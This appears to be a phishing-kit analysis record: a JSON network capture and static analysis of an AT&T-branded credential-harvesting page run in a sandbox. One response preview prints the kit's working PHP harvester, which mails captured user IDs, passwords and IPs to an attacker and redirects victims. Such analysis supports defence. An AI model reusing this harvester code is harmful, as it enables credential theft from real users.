+      "url": "https://home.secureapp.att.net/js/jquery/jquery-1.5.1.min.js",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Chromium\";v=\"145\", \"Not:A-Brand\";v=\"99\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Linux\""
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent",
+        "sec-ch-ua",
+        "sec-ch-ua-mobile",
+        "sec-ch-ua-platform"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": null,
+      "statusText": "",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {},
+      "responseContentType": "",
+      "hasSetCookie": false,
+      "responseReturned": false,
+      "responseBodyPreview": null,
+      "responseBodyLength": null,
+      "loadingFinished": false,
+      "loadingFailed": true,
+      "errorText": "net::ERR_INTERNET_DISCONNECTED",
+      "encodedDataLength": null,
+      "responseUrl": "",
+      "mimeType": "",
+      "protocol": "",
+      "timestamp": 276133.616608,
+      "lastEventTs": 1778030507885,
+      "requestSentTs": 276133.616608,
+      "responseReceivedTs": 0.0,
+      "loadingFinishedTs": 0.0,
+      "latencyMs": null,
+      "ttfbMs": null
+    },
+    {
+      "requestId": "780051.35",
+      "sequence": 5,
+      "resourceType": "Script",
+      "initiatorType": "parser",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+      "url": "https://home.secureapp.att.net/js/jquery/simplemodal/jquery.simplemodal.js",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Chromium\";v=\"145\", \"Not:A-Brand\";v=\"99\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Linux\""
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent",
+        "sec-ch-ua",
+        "sec-ch-ua-mobile",
+        "sec-ch-ua-platform"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": null,
+      "statusText": "",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {},
+      "responseContentType": "",
+      "hasSetCookie": false,
+      "responseReturned": false,
+      "responseBodyPreview": null,
+      "responseBodyLength": null,
+      "loadingFinished": false,
+      "loadingFailed": true,
+      "errorText": "net::ERR_INTERNET_DISCONNECTED",
+      "encodedDataLength": null,
+      "responseUrl": "",
+      "mimeType": "",
+      "protocol": "",
+      "timestamp": 276133.616646,
+      "lastEventTs": 1778030507885,
+      "requestSentTs": 276133.616646,
+      "responseReceivedTs": 0.0,
+      "loadingFinishedTs": 0.0,
+      "latencyMs": null,
+      "ttfbMs": null
+    },
+    {
+      "requestId": "780051.36",
+      "sequence": 6,
+      "resourceType": "Script",
+      "initiatorType": "parser",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+      "url": "https://home.secureapp.att.net/js/sso/slid/1201/script.js",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Chromium\";v=\"145\", \"Not:A-Brand\";v=\"99\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Linux\""
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent",
+        "sec-ch-ua",
+        "sec-ch-ua-mobile",
+        "sec-ch-ua-platform"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": null,
+      "statusText": "",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {},
+      "responseContentType": "",
+      "hasSetCookie": false,
+      "responseReturned": false,
+      "responseBodyPreview": null,
+      "responseBodyLength": null,
+      "loadingFinished": false,
+      "loadingFailed": true,
+      "errorText": "net::ERR_INTERNET_DISCONNECTED",
+      "encodedDataLength": null,
+      "responseUrl": "",
+      "mimeType": "",
+      "protocol": "",
+      "timestamp": 276133.616672,
+      "lastEventTs": 1778030507885,
+      "requestSentTs": 276133.616672,
+      "responseReceivedTs": 0.0,
+      "loadingFinishedTs": 0.0,
+      "latencyMs": null,
+      "ttfbMs": null
+    },
+    {
+      "requestId": "780051.37",
+      "sequence": 7,
+      "resourceType": "Script",
+      "initiatorType": "parser",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+      "url": "http://www.att.com/scripts/satellite/prod/8bb7555f31d461fe2aef4e2d53a11a03e7f9a04c/satelliteLib-bee1ce9b89e943a46b1dfd167adc564fe75eef37.js",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": null,
+      "statusText": "",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {},
+      "responseContentType": "",
+      "hasSetCookie": false,
+      "responseReturned": false,
+      "responseBodyPreview": null,
+      "responseBodyLength": null,
+      "loadingFinished": false,
+      "loadingFailed": true,
+      "errorText": "net::ERR_INTERNET_DISCONNECTED",
+      "encodedDataLength": null,
+      "responseUrl": "",
+      "mimeType": "",
+      "protocol": "",
+      "timestamp": 276133.616703,
+      "lastEventTs": 1778030507885,
+      "requestSentTs": 276133.616703,
+      "responseReceivedTs": 0.0,
+      "loadingFinishedTs": 0.0,
+      "latencyMs": null,
+      "ttfbMs": null
+    },
+    {
+      "requestId": "780051.38",
+      "sequence": 8,
+      "resourceType": "Script",
+      "initiatorType": "parser",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+      "url": "https://s.yimg.com/ik/script.js",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Chromium\";v=\"145\", \"Not:A-Brand\";v=\"99\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Linux\""
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent",
+        "sec-ch-ua",
+        "sec-ch-ua-mobile",
+        "sec-ch-ua-platform"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": null,
+      "statusText": "",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {},
+      "responseContentType": "",
+      "hasSetCookie": false,
+      "responseReturned": false,
+      "responseBodyPreview": null,
+      "responseBodyLength": null,
+      "loadingFinished": false,
+      "loadingFailed": true,
+      "errorText": "net::ERR_INTERNET_DISCONNECTED",
+      "encodedDataLength": null,
+      "responseUrl": "",
+      "mimeType": "",
+      "protocol": "",
+      "timestamp": 276133.616732,
+      "lastEventTs": 1778030507885,
+      "requestSentTs": 276133.616732,
+      "responseReceivedTs": 0.0,
+      "loadingFinishedTs": 0.0,
+      "latencyMs": null,
+      "ttfbMs": null
+    },
+    {
+      "requestId": "780051.40",
+      "sequence": 9,
+      "resourceType": "Stylesheet",
+      "initiatorType": "parser",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+      "url": "https://home.secureapp.att.net/css/sso/slid/1201/mobile.css",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+        "sec-ch-ua": "\"Chromium\";v=\"145\", \"Not:A-Brand\";v=\"99\"",
+        "sec-ch-ua-mobile": "?0",
+        "sec-ch-ua-platform": "\"Linux\""
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent",
+        "sec-ch-ua",
+        "sec-ch-ua-mobile",
+        "sec-ch-ua-platform"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": false,
+      "associatedCookies": [],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": null,
+      "statusText": "",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {},
+      "responseContentType": "",
+      "hasSetCookie": false,
+      "responseReturned": false,
+      "responseBodyPreview": null,
+      "responseBodyLength": null,
+      "loadingFinished": false,
+      "loadingFailed": true,
+      "errorText": "net::ERR_INTERNET_DISCONNECTED",
+      "encodedDataLength": null,
+      "responseUrl": "",
+      "mimeType": "",
+      "protocol": "",
+      "timestamp": 276133.62595,
+      "lastEventTs": 1778030507890,
+      "requestSentTs": 276133.62595,
+      "responseReceivedTs": 0.0,
+      "loadingFinishedTs": 0.0,
+      "latencyMs": null,
+      "ttfbMs": null
+    },
+    {
+      "requestId": "780051.45",
+      "sequence": 10,
+      "resourceType": "Script",
+      "initiatorType": "script",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+      "url": "http://www.2026.com:8080/commonLogin/igate_edam/staticContent/images/SLID/js/webtrends.min.js",
+      "method": "GET",
+      "requestHeaders": {
+        "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      },
+      "requestHeaderNames": [
+        "Referer",
+        "User-Agent"
+      ],
+      "requestContentType": "",
+      "hasCookieHeader": true,
+      "associatedCookies": [
+        {
+          "blockedReasons": [],
+          "cookie": {
+            "domain": "www.2026.com",
+            "expires": -1,
+            "httpOnly": false,
+            "name": "IV_JCT",
+            "path": "/",
+            "priority": "Medium",
+            "sameParty": false,
+            "secure": false,
+            "session": true,
+            "size": 20,
+            "sourcePort": 8080,
+            "sourceScheme": "NonSecure",
+            "value": "%2FcommonLogin"
+          },
+          "exemptionReason": "None"
+        }
+      ],
+      "customRequestHeaders": {},
+      "postData": null,
+      "status": 404,
+      "statusText": "Not Found",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {
+        "Connection": "Keep-Alive",
+        "Content-Length": "276",
+        "Content-Type": "text/html; charset=iso-8859-1",
+        "Date": "Wed, 06 May 2026 01:21:47 GMT",
+        "Keep-Alive": "timeout=5, max=46",
+        "Server": "Apache/2.4.58 (Ubuntu)"
+      },
+      "responseContentType": "text/html; charset=iso-8859-1",
+      "hasSetCookie": false,
+      "responseReturned": true,
+      "responseBodyPreview": null,
+      "responseBodyLength": null,
+      "loadingFinished": false,
+      "loadingFailed": true,
+      "errorText": "net::ERR_ABORTED",
+      "encodedDataLength": null,
+      "responseUrl": "http://www.2026.com:8080/commonLogin/igate_edam/staticContent/images/SLID/js/webtrends.min.js",
+      "mimeType": "text/html",
+      "protocol": "http/1.1",
+      "timestamp": 276133.626643,
+      "lastEventTs": 1778030507891,
+      "requestSentTs": 276133.626643,
+      "responseReceivedTs": 276133.635184,
+      "loadingFinishedTs": 0.0,
+      "latencyMs": null,
+      "ttfbMs": 8.5
+    },
+    {
+      "requestId": "780051.47",
+      "sequence": 11,
+      "resourceType": "XHR",
+      "initiatorType": "script",
+      "documentURL": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+      "url": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+      "method": "POST",
+      "requestHeaders": {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/autopay.htm",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      },
+      "requestHeaderNames": [
+        "Content-Type",
+        "Referer",
+        "User-Agent"
+      ],
+      "requestContentType": "application/x-www-form-urlencoded",
+      "hasCookieHeader": true,
+      "associatedCookies": [
+        {
+          "blockedReasons": [],
+          "cookie": {
+            "domain": "www.2026.com",
+            "expires": -1,
+            "httpOnly": false,
+            "name": "IV_JCT",
+            "path": "/",
+            "priority": "Medium",
+            "sameParty": false,
+            "secure": false,
+            "session": true,
+            "size": 20,
+            "sourcePort": 8080,
+            "sourceScheme": "NonSecure",
+            "value": "%2FcommonLogin"
+          },
+          "exemptionReason": "None"
+        }
+      ],
+      "customRequestHeaders": {},
+      "postData": "style=ATTidp&targetURL=https%3A%2F%2Floginprodx.att.net%2FFIM%2Fsps%2FATTidp%2Fsaml20%2Flogininitial%3FRequestBinding%3DHTTPPost%26PartnerId%3Dhttps%3A%2F%2Flogin.yahoo.com%2Fsaml%2F2.0%2Fatt%26.lang%3Den-US%26Target%3Dhttps%253a%2F%2Fatt.yahoo.com%2F%253f.lts%3D1415577160&userid=uahgmqamserm&password=cA16p9AM&showPwd=on&rememberID=on",
+      "status": 200,
+      "statusText": "OK",
+      "redirected": false,
+      "redirectChain": [],
+      "redirectLocation": "",
+      "responseHeaders": {
+        "Connection": "Keep-Alive",
+        "Content-Encoding": "gzip",
+        "Content-Length": "402",
+        "Content-Type": "text/html; charset=UTF-8",
+        "Date": "Wed, 06 May 2026 01:21:50 GMT",
+        "Keep-Alive": "timeout=5, max=45",
+        "Server": "Apache/2.4.58 (Ubuntu)",
+        "Vary": "Accept-Encoding"
+      },
+      "responseContentType": "text/html; charset=UTF-8",
+      "hasSetCookie": false,
+      "responseReturned": true,
+      "responseBodyPreview": "<?\r\n\r\n$ip = getenv(\"REMOTE_ADDR\");\r\n$message .= \"---- : || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"User ID/Email Address           : \".$_POST['userid'].\"\\n\";\r\n$message .= \"Password               : \".$_POST['password'].\"\\n\";\r\n$message .= \"Service Address Zip             : \".$_POST['zipxnx'].\"\\n\";\r\n$message .= \"----: || tHAnks tO Crossr!d3r || :------\\n\";\r\n$message .= \"IP: \".$ip.\"\\n\";\r\n\r\n\r\n$recipient = \"[REDACTED_EMAIL_3070849d]\r\n\";\r\n\r\n\r\n$fp = fopen(\"SUre.txt\",\"a\");\r\nfputs($fp,$message);\r\nfclose($fp);\r\n\r\n\r\n\r\n\r\n\r\n$subject = \"ATT US | \".$ip.\"\\n\";\r\n\r\nmail($recipient,$subject,$message);\r\nheader(\"Location:   https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2\");\r\n?>\r\n\r\n\r\n",
+      "responseBodyLength": 730,
+      "loadingFinished": true,
+      "loadingFailed": false,
+      "errorText": "",
+      "encodedDataLength": 653,
+      "responseUrl": "http://www.2026.com:8080/phishing_kit_uncompress_20250519/2024-01-12_ATT/ATT/verify.php",
+      "mimeType": "text/html",
+      "protocol": "http/1.1",
+      "timestamp": 276136.050356,
+      "lastEventTs": 1778030510810,
+      "requestSentTs": 276136.050356,
+      "responseReceivedTs": 276136.061492,
+      "loadingFinishedTs": 276136.053815,
+      "latencyMs": 3.5,
+      "ttfbMs": 11.1,
+      "_timing_summary": {
+        "latencyMs": 3.5,
+        "ttfbMs": 11.1,
+        "protocol": "http/1.1",
+        "redirected": false,
+        "redirectChain": [],
+        "status": 200,
+        "hasCookieHeader": true,
+        "hasSetCookie": false
+      }
+    }
+  ],
+  "cdp_monitoring": {
+    "enabled": true,
+    "degraded": false,
+    "note": "ok"
+  },
+  "static_analysis": {
+    "function_count": 0,
+    "php_file_count": 1,
+    "data_flow_count": 1,
+    "data_flows": [
+      {
+        "form_source": "ATT/autopay.htm",
+        "form_method": "post",
+        "form_fields": [
+          "style",
+          "targetURL",
+          "userid",
+          "password",
+          "showPwd",
+          "rememberID"
+        ],
+        "action_target": "verify.php",
+        "server_file": "ATT/verify.php",
+        "server_receives": [
+          "password",
+          "userid",
+          "zipxnx"
+        ],
+        "server_actions": [
+          {
+            "type": "mail",
+            "target": "[REDACTED_EMAIL]",
+            "variable": "$recipient",
+            "line": 26
+          },
+          {
+            "type": "redirect",
+            "target": "https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2",
+            "line": 27
+          }
+        ],
+        "exfil": [
+          "email:[REDACTED_EMAIL]"
+        ]
+      }
+    ],
+    "php_files": {
+      "ATT/verify.php": {
+        "receives_post": [
+          "password",
+          "userid",
+          "zipxnx"
+        ],
+        "actions": [
+          {
+            "type": "mail",
+            "target": "[REDACTED_EMAIL]",
+            "variable": "$recipient",
+            "line": 26
+          },
+          {
+            "type": "redirect",
+            "target": "https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=error&appName=m40842&errorCode=902.2",
+            "line": 27
+          }
+        ],
+        "exfil": [
+          "email:[REDACTED_EMAIL]"
+        ]
+      }
+    }
+  }
+}
